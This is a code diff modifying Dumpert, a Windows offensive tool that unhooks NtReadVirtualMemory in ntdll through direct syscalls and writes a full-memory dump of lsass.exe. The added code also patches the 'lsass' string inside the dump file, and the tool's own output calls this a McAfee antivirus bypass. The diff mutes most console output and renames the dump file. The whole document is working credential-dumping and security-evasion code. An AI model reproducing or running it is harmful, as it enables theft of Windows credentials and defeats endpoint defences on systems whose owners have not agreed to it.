@@ -8,7 +8,68 @@
 #include "Dumpert.h"
 #include <DbgHelp.h>
 
+// FBK
+
 #pragma comment (lib, "Dbghelp.lib")
+
+void DumpHex(const void* data, size_t size, int address) {
+	char ascii[17];
+	size_t i, j;
+	ascii[16] = '\0';
+	printf("%08X  |  ", address);
+	for (i = 0; i < size; ++i) {
+		printf("%02X ", ((unsigned char*)data)[i]);
+		if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
+			ascii[i % 16] = ((unsigned char*)data)[i];
+		}
+		else {
+			ascii[i % 16] = '.';
+		}
+		if ((i + 1) % 8 == 0 || i + 1 == size) {
+			printf(" ");
+			if ((i + 1) % 16 == 0) {
+				printf("|  %s \n", ascii);
+				printf("%08X  |  ", address+i+1);
+
+			}
+			else if (i + 1 == size) {
+				ascii[(i + 1) % 16] = '\0';
+				if ((i + 1) % 16 <= 8) {
+					printf(" ");
+				}
+				for (j = (i + 1) % 16; j < 16; ++j) {
+					printf("   ");
+				}
+				printf("|  %s \n", ascii);
+			}
+		}
+	}
+}
+
+char *find_str_in_data(const char *str, const char *data, int length)
+{
+	int pos = 0;
+	int slen = strlen(str);
+	int datalen = strlen(data);
+	int diff = length - slen;
+
+	int i = 0;
+	while (pos < (length - slen))
+	{
+		pos++;
+		i = 0;
+
+		while (i < slen && str[i] == data[pos + i])
+		{
+			i++;
+		}
+		if (i == slen) {
+			return data + pos;
+		}
+	}
+	return NULL;
+}
+
 
 
 BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
@@ -40,30 +101,37 @@ BOOL Unhook_NativeAPI(IN PWIN_VER_INFO pWinVerInfo) {
 
 	LPVOID lpProcAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), pWinVerInfo->lpApiCall);
 
-	printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
-	printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
-	printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);
+	//printf("	[+] %s function pointer at: 0x%p\n", pWinVerInfo->lpApiCall, lpProcAddress);
+	//printf("	[+] %s System call nr is: 0x%x\n", pWinVerInfo->lpApiCall, AssemblyBytes[4]);
+	//printf("	[+] Unhooking %s.\n", pWinVerInfo->lpApiCall);
 
 	LPVOID lpBaseAddress = lpProcAddress;
 	ULONG OldProtection, NewProtection;
 	SIZE_T uSize = 10;
 	NTSTATUS status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, PAGE_EXECUTE_READWRITE, &OldProtection);
 	if (status != STATUS_SUCCESS) {
-		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
+		//wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
+		wprintf(L"failed.\n");
+
 		return FALSE;
 	}
 	
 	status = ZwWriteVirtualMemory(GetCurrentProcess(), lpProcAddress, (PVOID)AssemblyBytes, sizeof(AssemblyBytes), NULL);
 	if (status != STATUS_SUCCESS) {
-		wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
+		//wprintf(L"	[!] ZwWriteVirtualMemory failed.\n");
+		wprintf(L"failed.\n");
 		return FALSE;
 	}
 
 	status = ZwProtectVirtualMemory(GetCurrentProcess(), &lpBaseAddress, &uSize, OldProtection, &NewProtection);
 	if (status != STATUS_SUCCESS) {
-		wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
+		//wprintf(L"	[!] ZwProtectVirtualMemory failed.\n");
+		wprintf(L"failed.\n");
 		return FALSE;
 	}
+
+
+
 
 	return TRUE;
 }
@@ -182,19 +250,22 @@ BOOL SetDebugPrivilege() {
 
 
 int wmain(int argc, wchar_t* argv[]) {
-	wprintf(L" ________          __    _____.__                 __				\n");
-	wprintf(L" \\_____  \\  __ ___/  |__/ ____\\  | _____    ____ |  | __		\n");
-	wprintf(L"  /   |   \\|  |  \\   __\\   __\\|  | \\__  \\  /    \\|  |/ /	\n");
-	wprintf(L" /    |    \\  |  /|  |  |  |  |  |__/ __ \\|   |  \\    <		\n");
-	wprintf(L" \\_______  /____/ |__|  |__|  |____(____  /___|  /__|_ \\		\n");
-	wprintf(L"         \\/                             \\/     \\/     \\/		\n");
-	wprintf(L"                                  Dumpert							\n");
-	wprintf(L"                               By Cneeliz @Outflank 2019		    \n\n");
+	//wprintf(L" ________          __    _____.__                 __				\n");
+	//wprintf(L" \\_____  \\  __ ___/  |__/ ____\\  | _____    ____ |  | __		\n");
+	//wprintf(L"  /   |   \\|  |  \\   __\\   __\\|  | \\__  \\  /    \\|  |/ /	\n");
+	//wprintf(L" /    |    \\  |  /|  |  |  |  |  |__/ __ \\|   |  \\    <		\n");
+	//wprintf(L" \\_______  /____/ |__|  |__|  |____(____  /___|  /__|_ \\		\n");
+	//wprintf(L"         \\/                             \\/     \\/     \\/		\n");
+	//wprintf(L"                           D u m p e r t	 modified version		\n");
 
 	LPCWSTR lpwProcName = L"lsass.exe";
 
+
+	
 	if (sizeof(LPVOID) != 8) {
-		wprintf(L"[!] Sorry, this tool only works on a x64 version of Windows.\n");
+		//wprintf(L"[!] Sorry, this tool only works on a x64 version of Windows.\n");
+		wprintf(L"failed not x64\n");
+
 		exit(1);
 	}
 
@@ -232,6 +303,10 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtCreateFile = &NtCreateFile10;
 		ZwClose = &ZwClose10;
 		pWinVerInfo->SystemCall = 0x3F;
+		//FBK
+		NtReadFile = &NtReadFile10;
+		NtWriteFile = &NtWriteFile10;
+
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.1") == 0 && osInfo.dwBuildNumber == 7601) {
 		lpOSVersion = L"7 SP1 or Server 2008 R2";
@@ -241,6 +316,11 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtCreateFile = &NtCreateFile7SP1;
 		ZwClose = &ZwClose7SP1;
 		pWinVerInfo->SystemCall = 0x3C;
+		//FBK
+		NtReadFile = &NtReadFile7SP1;
+		NtWriteFile = &NtWriteFile7SP1;
+
+
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.2") == 0) {
 		lpOSVersion = L"8 or Server 2012";
@@ -250,6 +330,10 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtCreateFile = &NtCreateFile80;
 		ZwClose = &ZwClose80;
 		pWinVerInfo->SystemCall = 0x3D;
+		
+		NtReadFile = &NtReadFile80;
+		NtWriteFile = &NtWriteFile80;
+
 	}
 	else if (_wcsicmp(pWinVerInfo->chOSMajorMinor, L"6.3") == 0) {
 		lpOSVersion = L"8.1 or Server 2012 R2";
@@ -259,6 +343,10 @@ int wmain(int argc, wchar_t* argv[]) {
 		NtCreateFile = &NtCreateFile81;
 		ZwClose = &ZwClose81;
 		pWinVerInfo->SystemCall = 0x3E;
+		
+		NtReadFile = &NtReadFile81;
+		NtWriteFile = &NtWriteFile81;
+
 	}
 	else {
 		wprintf(L"	[!] OS Version not supported.\n\n");
@@ -284,7 +372,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	pWinVerInfo->lpApiCall = "NtReadVirtualMemory";
 
 	if (!Unhook_NativeAPI(pWinVerInfo)) {
-		printf("	[!] Unhooking %s failed.\n", pWinVerInfo->lpApiCall);
+		printf("	[!] Unh00king %s failed.\n", pWinVerInfo->lpApiCall);
 		exit(1);
 	}
 
@@ -309,7 +397,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	WCHAR chWinPath[MAX_PATH];
 	GetWindowsDirectory(chWinPath, MAX_PATH);
 	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), chWinPath);
-	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\dumpert.dmp");
+	wcscat_s(chDmpFile, sizeof(chDmpFile) / sizeof(wchar_t), L"\\Temp\\mydump.bin");
 
 	UNICODE_STRING uFileName;
 	RtlInitUnicodeString(&uFileName, chDmpFile);
@@ -317,13 +405,14 @@ int wmain(int argc, wchar_t* argv[]) {
 	wprintf(L"	[+] Dump %wZ memory to: %wZ\n", pWinVerInfo->ProcName, uFileName);
 	
 	HANDLE hDmpFile = NULL;
+
 	IO_STATUS_BLOCK IoStatusBlock;
 	ZeroMemory(&IoStatusBlock, sizeof(IoStatusBlock));
 	OBJECT_ATTRIBUTES FileObjectAttributes;
 	InitializeObjectAttributes(&FileObjectAttributes, &uFileName, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
 	//  Open input file for writing, overwrite existing file.
-	status = NtCreateFile(&hDmpFile, FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
+	status = NtCreateFile(&hDmpFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE, &FileObjectAttributes, &IoStatusBlock, 0,
 		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
 
 	if (hDmpFile == INVALID_HANDLE_VALUE) {
@@ -333,19 +422,58 @@ int wmain(int argc, wchar_t* argv[]) {
 	}
 
 	DWORD dwTargetPID = GetProcessId(hProcess);
-	BOOL Success = MiniDumpWriteDump(hProcess,
-		dwTargetPID,
-		hDmpFile,
-		MiniDumpWithFullMemory,
-		NULL,
-		NULL,
-		NULL);
+	BOOL Success = MiniDumpWriteDump(hProcess, dwTargetPID, hDmpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
 	if ((!Success))
 	{
 		wprintf(L"	[!] Failed to create minidump, error code: %x\n", GetLastError());
 	}
 	else {
 		wprintf(L"	[+] Dump succesful.\n");
+
+
+	}
+
+	Sleep(1000);
+	
+	LARGE_INTEGER      byteOffset;
+
+
+	unsigned char szBuffer[2048];
+	char *s;
+	BOOL found = FALSE;
+	ULONG readSize = 2048;
+	char McAfeeString[] = { 'l', 's', 'a', 's', 's' };
+		
+	ZeroMemory(&szBuffer, 2048);
+
+	wprintf(L"[4] Read Dump File\n");
+	byteOffset.LowPart = byteOffset.HighPart = 0;
+	while (!found) {
+		status = NtReadFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
+		if (status == STATUS_SUCCESS) {
+			s = find_str_in_data(McAfeeString, szBuffer, readSize);
+			if ((s != NULL) || ( byteOffset.LowPart >= 40000)){
+				found = TRUE;
+				//DumpHex(szBuffer, readSize, byteOffset.LowPart);
+				szBuffer[s - szBuffer]     = 'm';
+				szBuffer[s - szBuffer + 1] = 'c';
+				szBuffer[s - szBuffer + 2] = 'a';
+				szBuffer[s - szBuffer + 3] = 'f';
+				szBuffer[s - szBuffer + 4] = 'f';
+				wprintf(L"	[+] McAfee AV bypass. Replacing string at address %08X\n", s - szBuffer + byteOffset.LowPart);
+				//DumpHex(szBuffer, readSize, byteOffset.LowPart);
+				wprintf(L"	[+] Rewriting Dump File\n");
+				status = NtWriteFile(hDmpFile, NULL, NULL, NULL, &IoStatusBlock, &szBuffer, readSize, &byteOffset, NULL);
+				
+			}
+
+			byteOffset.LowPart += readSize;
+
+		}
+		else {
+			wprintf(L"	[-] Failed to read dump file.\n");
+
+		}
 	}
 
 	ZwClose(hDmpFile);
